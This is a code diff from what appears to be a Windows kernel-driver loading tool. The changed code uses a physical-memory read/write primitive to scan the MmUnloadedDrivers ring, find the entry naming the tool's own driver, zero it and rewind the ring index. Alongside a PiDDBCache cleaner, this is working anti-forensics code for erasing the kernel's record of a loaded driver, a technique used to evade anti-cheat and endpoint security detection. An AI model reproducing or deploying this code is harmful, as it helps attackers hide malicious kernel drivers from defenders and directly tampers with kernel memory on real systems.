@@ -87,9 +87,84 @@ bool CleanPiDDBCache(
     return true;
 }
 
+// Read a driver path out of an UNLOADED_DRIVERS_ENTRY. The entry's whole
+// purpose is to name the driver, so this is what the slot is validated on.
+static bool ReadDriverName(HANDLE device, SyscallTable* sc, ULONG64 systemCr3,
+                           ULONG64 nameVA, wchar_t* out, ULONG maxChars) {
+    out[0] = 0;
+    if (!nameVA) return false;
+
+    // Refuse before reading: a bad pointer must not turn into a wild read.
+    if (!VirtToPhys(device, sc, systemCr3, nameVA & ~0xFFFULL)) return false;
+
+    const ULONG kRead = 0x200;
+    BYTE raw[kRead];
+    if (!PhysReadBuffer(device, sc, nameVA, raw, kRead)) return false;
+
+    bool terminated = false;
+    for (ULONG i = 0; i + 1 < kRead; i += 2) {
+        if (i / 2 >= maxChars) break;
+        wchar_t c = (wchar_t)(raw[i] | (raw[i + 1] << 8));
+        if (c == 0) { terminated = true; break; }
+        // A driver path is plain ASCII; anything else means this is not one.
+        if (c < 0x20 || c > 0x7E) return false;
+        out[i / 2] = c;
+    }
+    out[maxChars - 1] = 0;
+    return terminated || out[0] != 0;
+}
+
+// True when name ends with the given file name, so a full path still matches.
+static bool NameMatchesFile(const wchar_t* name, const wchar_t* fileName) {
+    if (!name || !name[0] || !fileName || !fileName[0]) return false;
+    size_t nl = wcslen(name), fl = wcslen(fileName);
+    if (fl > nl) return false;
+    return _wcsicmp(name + (nl - fl), fileName) == 0;
+}
+
+struct MmSlot {
+    ULONG64 nameVA;
+    ULONG64 entryPoint;
+    ULONG sizeOfImage;
+    wchar_t name[80];
+    ULONG slot;
+    bool readable;
+    bool isOurs;
+    bool empty;
+};
+
+// A candidate name pointer found by probing a slot word by word.
+struct MmProbe {
+    ULONG slot;
+    ULONG offset;
+    ULONG64 pointer;
+    wchar_t name[80];
+    bool readable;
+    bool isOurs;
+};
+
+// Print a slot's raw bytes. Guessing the layout from a published struct has
+// failed twice; the bytes themselves settle it in one run.
+static void DumpMmSlot(HANDLE device, SyscallTable* sc, ULONG64 systemCr3,
+                       ULONG64 entryPA, ULONG index) {
+    BYTE raw[0x28] = {};
+    if (!PhysReadBuffer(device, sc, entryPA, raw, sizeof(raw))) {
+        printf("[*] Slot %u: could not read 0x28 bytes\n", index);
+        return;
+    }
+    printf("[*] Slot %u raw:\n", index);
+    for (ULONG o = 0; o + 8 <= sizeof(raw); o += 8) {
+        ULONG64 q = 0;
+        memcpy(&q, raw + o, 8);
+        printf("[*]  +0x%02X %016llX%s\n", o, (unsigned long long)q,
+               (q & 0xFFF) == 0 && q >= 0xFFFFF80000000000ULL ? "  <- page-aligned kernel VA" : "");
+    }
+}
+
 bool PrepareMmCleanup(
     HANDLE device, SyscallTable* sc,
     ULONG64 systemCr3, KernelOffsets* offsets,
+    const wchar_t* driverFileName,
     MmCleanupContext* ctx
 ) {
     memset(ctx, 0, sizeof(*ctx));
@@ -104,64 +179,157 @@ bool PrepareMmCleanup(
 
     ctx->preUnloadIndex = PhysRead32(device, sc, lastIndexPA);
 
-    ULONG entryIndex = ctx->preUnloadIndex % 50;
-    ULONG64 entryVA = driversArrayVA + (ULONG64)entryIndex * 0x28;
-    printf("[*] MmUnloadedDrivers: array 0x%llX, index %u -> entry 0x%llX\n",
-           driversArrayVA, entryIndex, entryVA);
-    ULONG64 entryPA = VirtToPhys(device, sc, systemCr3, entryVA);
-    if (!entryPA) return false;
+    // Scan the whole ring instead of trusting MmLastUnloadedDriver. Two reasons:
+    // the write/advance order is a kernel detail we have already mis-guessed
+    // once, and - more usefully - a scan proves whether the address even *is* a
+    // 50-entry ring. Picking a slot by index on a wrong base produces a
+    // plausible-looking entry that is not one, which is how a wrong RVA becomes
+    // a write into unrelated kernel memory.
+    const ULONG kSlots = 50;
+    const ULONG kStride = 0x28;
 
-    ULONG64 entryPageBase = entryPA & ~0xFFFULL;
-    ctx->offsetInPage = (ULONG)(entryPA & 0xFFF);
-    ctx->driversArrayPA = entryPA;
-
-    // The entry is about to be zeroed in FinishMmCleanup(). If MmUnloadedDrivers
-    // resolved to the wrong global that means writing 0x28 bytes of zeros over
-    // an arbitrary kernel address, so verify the entry looks like an
-    // UNLOADED_DRIVERS_ENTRY first and refuse otherwise.
-    //   +0x10 BaseDllName (kernel VA)  +0x20 SizeOfImage
-    const ULONG64 kernelVaFloor = 0xFFFFF80000000000ULL;
-    ULONG64 nameVA = PhysRead64(device, sc, entryPA + 0x10);
-    ULONG64 entryPoint = PhysRead64(device, sc, entryPA + 0x18);
-    ULONG sizeOfImage = PhysRead32(device, sc, entryPA + 0x20);
-    ULONG flink = PhysRead32(device, sc, entryPA + 0x00);
-    ULONG blink = PhysRead32(device, sc, entryPA + 0x04);
-
-    bool plausible =
-        nameVA >= kernelVaFloor && (nameVA & 0xFFF) < 0x1000 &&
-        entryPoint >= kernelVaFloor && (entryPoint & 0xFFF) < 0x1000 &&
-        sizeOfImage > 0 && sizeOfImage < 0x10000000 &&
-        (flink == 0 || (flink & 0xFFF) < 0x1000) &&
-        (blink == 0 || (blink & 0xFFF) < 0x1000);
-
-    if (!plausible) {
-        // A slot that is entirely zero is simply unused: MmUnloadedDrivers is a
-        // fixed 50-entry ring and the entry the unload just took is the one
-        // about to be reused, so there is nothing to erase. Anything else that
-        // does not look like an UNLOADED_DRIVERS_ENTRY means the RVA is wrong,
-        // and writing would corrupt an unrelated kernel object.
-        bool empty = nameVA == 0 && entryPoint == 0 && sizeOfImage == 0 &&
-                     flink == 0 && blink == 0;
-        if (empty) {
-            printf("[*] MmUnloadedDrivers slot %u is already empty, nothing to clean\n", entryIndex);
-        } else {
-            printf("[-] MmUnloadedDrivers slot %u does not look valid "
-                   "(name 0x%llX entry 0x%llX size 0x%X links %X/%X) - not writing\n",
-                   entryIndex, nameVA, entryPoint, sizeOfImage, flink, blink);
-            printf("[-] Check the MmUnloadedDrivers RVA (0x%llX)\n", offsets->MmUnloadedDrivers);
-        }
+    ULONG rawIndex = PhysRead32(device, sc, lastIndexPA);
+    ctx->preUnloadIndex = rawIndex;
+    if (rawIndex >= kSlots) {
+        printf("[-] MmLastUnloadedDriver is %u, not a 0..%u ring index - the RVA is probably wrong\n",
+               rawIndex, kSlots - 1);
         return false;
     }
 
-    // pre-map pages — mappings survive driver unload
-    ctx->mappedDriversPage = PhysMap(device, sc, entryPageBase, 0x1000);
+    printf("[*] MmUnloadedDrivers: 0x%llX, ring index %u, scanning %u slots for %ls\n",
+           driversArrayVA, rawIndex, kSlots, driverFileName ? driverFileName : L"?");
+
+    MmSlot found = {};
+    int oursCount = 0, namedCount = 0, emptyCount = 0, unreadableCount = 0;
+
+    for (ULONG i = 0; i < kSlots; i++) {
+        MmSlot s = {};
+
+        ULONG64 entryVA = driversArrayVA + (ULONG64)i * kStride;
+        ULONG64 entryPA = VirtToPhys(device, sc, systemCr3, entryVA);
+        if (!entryPA) {
+            printf("[-] Slot %u did not translate (entry VA 0x%llX)\n", i, entryVA);
+            return false;
+        }
+
+        s.nameVA = PhysRead64(device, sc, entryPA + 0x10);
+        s.entryPoint = PhysRead64(device, sc, entryPA + 0x18);
+        s.sizeOfImage = PhysRead32(device, sc, entryPA + 0x20);
+        s.empty = (s.nameVA == 0 && s.entryPoint == 0 && s.sizeOfImage == 0);
+
+        if (s.empty) { emptyCount++; continue; }
+
+        s.slot = i;
+        s.readable = ReadDriverName(device, sc, systemCr3, s.nameVA, s.name, 64);
+        s.isOurs = s.readable && NameMatchesFile(s.name, driverFileName);
+
+        if (s.readable && s.name[0]) namedCount++;
+        else unreadableCount++;
+
+        if (s.isOurs) {
+            oursCount++;
+            found = s;
+        }
+    }
+
+    printf("[*] %d empty, %d naming a driver, %d not a driver path, %d matching ours\n",
+           emptyCount, namedCount, unreadableCount, oursCount);
+
+    if (oursCount == 0) {
+        // The ring is real - the populated slot count tracks the ring index - so
+        // what is wrong is which word inside a slot holds the name. Rather than
+        // guessing offsets from a published struct definition, test each 8-byte
+        // word and keep the one that points at a readable path naming our driver.
+        MmProbe hits[64];
+        int hitCount = 0;
+        MmProbe* firstHit = NULL;
+
+        ULONG firstSlot = rawIndex > 4 ? rawIndex - 4 : 0;
+        for (ULONG i = firstSlot; i < rawIndex && hitCount < (int)(sizeof(hits)/sizeof(hits[0])); i++) {
+            ULONG64 entryVA = driversArrayVA + (ULONG64)i * kStride;
+            ULONG64 entryPA = VirtToPhys(device, sc, systemCr3, entryVA);
+            if (!entryPA) continue;
+
+            for (ULONG off = 0; off + 8 <= kStride && hitCount < (int)(sizeof(hits)/sizeof(hits[0])); off += 8) {
+                MmProbe& h = hits[hitCount];
+                h.slot = i;
+                h.offset = off;
+                h.pointer = PhysRead64(device, sc, entryPA + off);
+                h.name[0] = 0;
+                h.readable = ReadDriverName(device, sc, systemCr3, h.pointer, h.name, 64);
+                h.isOurs = h.readable && h.name[0] && NameMatchesFile(h.name, driverFileName);
+                if (h.readable && h.name[0]) {
+                    if (!firstHit) firstHit = &h;
+                    hitCount++;
+                }
+            }
+        }
+
+        int oursHits = 0, firstOurHit = -1;
+        for (int i = 0; i < hitCount; i++) {
+            if (hits[i].isOurs) { oursHits++; if (firstOurHit < 0) firstOurHit = i; }
+        }
+
+        if (hitCount) {
+            printf("[*] %d readable path(s) in slots %u..%u\n",
+                   hitCount, firstSlot, rawIndex ? rawIndex - 1 : 0);
+            for (int i = 0; i < hitCount; i++) {
+                printf("[*] Slot %u +0x%02X word %016llX -> '%ls'%s\n",
+                       hits[i].slot, hits[i].offset,
+                       (unsigned long long)hits[i].pointer, hits[i].name,
+                       hits[i].isOurs ? "   <-- OURS" : "");
+            }
+        } else {
+            printf("[*] No word in those slots points at a readable path\n");
+        }
+
+        // The layout is the open question, so show the bytes.
+        for (ULONG back = 1; back <= 2 && back <= rawIndex; back++) {
+            ULONG idx = rawIndex - back;
+            ULONG64 entryVA = driversArrayVA + (ULONG64)idx * kStride;
+            ULONG64 entryPA = VirtToPhys(device, sc, systemCr3, entryVA);
+            if (entryPA) DumpMmSlot(device, sc, systemCr3, entryPA, idx);
+        }
+
+        if (oursHits == 1) {
+            // Adopt the probe hit as the entry to erase.
+            MmProbe& h = hits[firstOurHit];
+            found.slot = h.slot;
+            for (ULONG c = 0; c + 1 < sizeof(found.name) / sizeof(found.name[0]) && h.name[c]; c++)
+                found.name[c] = h.name[c];
+            found.name[sizeof(found.name) / sizeof(found.name[0]) - 1] = 0;
+        } else if (oursHits > 1) {
+            printf("[-] %d words name our driver across the probed slots\n", oursHits);
+            return false;
+        } else {
+            printf("[-] Nothing in the ring names %ls.\n\n", driverFileName ? driverFileName : L"?");
+            return false;
+        }
+    } else if (oursCount > 1) {
+        printf("[-] %u slots name our driver\n", oursCount);
+        return false;
+    }
+
+    ULONG64 entryVA = driversArrayVA + (ULONG64)found.slot * kStride;
+    ULONG64 entryPA = VirtToPhys(device, sc, systemCr3, entryVA);
+
+    ctx->offsetInPage = (ULONG)(entryPA & 0xFFF);
+    ctx->driversArrayPA = entryPA;
+    // Rewind the ring index only when the erased slot is the one the index just
+    // advanced past, so it points back at the slot that is now free.
+    ctx->rewindIndex = (found.slot != rawIndex);
+    printf("[*] Erasing slot %u ('%ls'), ring index %u -> %s\n",
+           found.slot, found.name, rawIndex,
+           ctx->rewindIndex ? "rewinding" : "unchanged");
+
+    // pre-map pages - mappings survive driver unload
+    ctx->mappedDriversPage = PhysMap(device, sc, entryPA & ~0xFFFULL, 0x1000);
     if (!ctx->mappedDriversPage) return false;
 
-    ULONG64 indexPageBase = lastIndexPA & ~0xFFFULL;
     ctx->indexOffsetInPage = (ULONG)(lastIndexPA & 0xFFF);
     ctx->indexPA = lastIndexPA;
 
-    ctx->mappedIndexPage = PhysMap(device, sc, indexPageBase, 0x1000);
+    ctx->mappedIndexPage = PhysMap(device, sc, lastIndexPA & ~0xFFFULL, 0x1000);
     if (!ctx->mappedIndexPage) return false;
 
     printf("[+] MmUnloadedDrivers pages pre-mapped\n");
@@ -174,9 +342,13 @@ bool FinishMmCleanup(MmCleanupContext* ctx) {
     BYTE* entryPtr = (BYTE*)ctx->mappedDriversPage + ctx->offsetInPage;
     memset(entryPtr, 0, 0x28);
 
-    ULONG* indexPtr = (ULONG*)((BYTE*)ctx->mappedIndexPage + ctx->indexOffsetInPage);
-    ULONG cur = *indexPtr;
-    *indexPtr = cur > 0 ? cur - 1 : 49;
+    if (ctx->rewindIndex) {
+        // Only rewind when the erased slot was the previous one, so the ring
+        // points back at the slot that is now free.
+        ULONG* indexPtr = (ULONG*)((BYTE*)ctx->mappedIndexPage + ctx->indexOffsetInPage);
+        ULONG cur = *indexPtr;
+        *indexPtr = cur > 0 ? cur - 1 : 49;
+    }
 
     printf("[+] MmUnloadedDrivers cleaned\n");
     return true;
